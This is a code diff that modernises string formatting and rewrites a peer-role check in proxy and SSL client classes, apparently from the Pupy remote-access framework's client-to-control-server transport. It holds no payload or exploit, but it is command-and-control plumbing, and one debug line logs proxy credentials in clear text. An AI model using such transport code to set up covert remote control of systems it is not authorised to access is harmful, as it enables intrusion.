@@ -20,7 +20,7 @@ from . import getLogger
 try:
     from . import socks
 except ImportError as e:
-    logging.warning("%s: socks module disabled, auto_connect unavailable"%e)
+    logging.warning(f"{e}: socks module disabled, auto_connect unavailable")
     socks = None
 
 logger = getLogger('clients')
@@ -106,10 +106,13 @@ class PupyProxifiedTCPClient(PupyTCPClient):
 
             logger.debug(
                 'Connect via %s:%s (type=%s%s)',
-                proxy_addr, proxy_port or 'default', proxy.type,
-                ' auth={}:{}'.format(
-                    proxy.username, proxy.password
-                ) if proxy.username else '')
+                proxy_addr,
+                proxy_port or 'default',
+                proxy.type,
+                f' auth={proxy.username}:{proxy.password}'
+                if proxy.username
+                else '',
+            )
 
             s.add_proxy(
                 proxy_type=proxy.type,
@@ -193,7 +196,7 @@ class PupySSLClient(PupyTCPClient):
             os.write(fd_ca_path, self.SSL_CA_CERT)
             os.close(fd_ca_path)
         except Exception as e:
-            logging.error("Error writing certificates to temp file %s"%e)
+            logging.error(f"Error writing certificates to temp file {e}")
             raise e
 
         exception = None
@@ -228,9 +231,10 @@ class PupySSLClient(PupyTCPClient):
             if item[0][0] == 'organizationalUnitName':
                 peer_role = item[0][1]
 
-        if not (self.ROLE == 'CLIENT' and peer_role == 'CONTROL' or \
-            self.ROLE == 'CONTROL' and peer_role == 'CLIENT'):
-            raise ValueError('Invalid peer role: {}'.format(peer_role))
+        if (self.ROLE != 'CLIENT' or peer_role != 'CONTROL') and (
+            self.ROLE != 'CONTROL' or peer_role != 'CLIENT'
+        ):
+            raise ValueError(f'Invalid peer role: {peer_role}')
 
         return wrapped_socket
 
